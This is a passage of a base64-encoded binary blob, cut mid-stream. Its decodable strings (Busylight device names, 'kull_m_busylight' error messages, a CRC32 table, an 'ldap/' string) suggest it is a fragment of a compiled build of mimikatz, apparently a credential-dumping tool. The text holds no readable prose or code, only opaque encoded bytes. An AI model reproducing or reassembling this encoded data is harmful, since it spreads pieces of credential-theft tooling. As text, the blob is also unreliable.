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BzAHkAbABpAGcAaAB0AF8AZABlAHYAaQBjAGUAcwBfAGcAZQB0ACAAOwAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACAAKABoAEsAZQBlAHAAQQBsAGkAdgBlAFQAaAByAGUAYQBkACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBiAHUAcwB5AGwAaQBnAGgAdABfAGQAZQB2AGkAYwBlAHMAXwBnAGUAdAAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABoAEIAdQBzAHkAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBiAHUAcwB5AGwAaQBnAGgAdABfAGQAZQB2AGkAYwBlAHMAXwBnAGUAdAAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABkAGUAdgBpAGMAZQBIAGEAbgBkAGwAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AYgB1AHMAeQBsAGkAZwBoAHQAXwBkAGUAdgBpAGMAZQBzAF8AZwBlAHQAIAA7ACAAUwBlAHQAdQBwAEQAaQBHAGUAdABDAGwAYQBzAHMARABlAHYAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AYgB1AHMAeQBsAGkAZwBoAHQAXwBkAGUAdgBpAGMAZQBfAHMAZQBuAGQAXwByAGEAdwAgADsAIABbAGQAZQB2AGkAYwBlACAAJQB1AF0AIABXAHIAaQB0AGUARgBpAGwAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAGIAdQBzAHkAbABpAGcAaAB0AF8AZABlAHYAaQBjAGUAXwBzAGUAbgBkAF8AcgBhAHcAIAA7ACAAWwBkAGUAdgBpAGMAZQAgACUAdQBdACAAUwBpAHoAZQAgAGkAcwAgAG4AbwB0ACAAdgBhAGwAaQBkAGUAIAAoAHMAaQB6ACAAPQAgACUAdQAsACAAbQBhAHgAIAA9ACAAJQB1ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAGIAdQBzAHkAbABpAGcAaAB0AF8AZABlAHYAaQBjAGUAXwBzAGUAbgBkAF8AcgBhAHcAIAA7ACAAWwBkAGUAdgBpAGMAZQAgACUAdQBdACAASQBuAHYAYQBsAGkAZAAgAEQAZQB2AGkAYwBlAC8AQgB1AHMAeQAgAEgAYQBuAGQAbABlAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AYgB1AHMAeQBsAGkAZwBoAHQAXwBkAGUAdgBpAGMAZQBfAHIAZQBhAGQAXwByAGEAdwAgADsAIABbAGQAZQB2AGkAYwBlACAAJQB1AF0AIABSAGUAYQBkAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AYgB1AHMAeQBsAGkAZwBoAHQAXwBkAGUAdgBpAGMAZQBfAHIAZQBhAGQAXwByAGEAdwAgADsAIABbAGQAZQB2AGkAYwBlACAAJQB1AF0AIAAlAHUAIABiAHkAdABlACgAcwApACAAcgBlAGEAZABlAGQALAAgACUAdQAgAHcAYQBuAHQAZQBkAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBiAHUAcwB5AGwAaQBnAGgAdABfAGQAZQB2AGkAYwBlAF8AcgBlAGEAZABfAHIAYQB3ACAAOwAgAFsAZABlAHYAaQBjAGUAIAAlAHUAXQAgAEkAbgB2AGEAbABpAGQAIABEAGUAdgBpAGMAZQAvAEIAdQBzAHkAIABIAGEAbgBkAGwAZQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAGIAdQBzAHkAbABpAGcAaAB0AF8AZABlAHYAaQBjAGUAXwByAGUAYQBkAF8AaQBuAGYAbwBzACAAOwAgAFsAZABlAHYAaQBjAGUAIAAlAHUAXQAgAGQAYQB0AGEAWwAwAF0AIABpAHMAIABuAG8AdAAgAE4AVQBMAEwAIAAoADAAeAAlADAAMgB4ACkACgAAAAAAAAAAALsnyjsOAAAAsLgEgAEAAAC7J8s7Bg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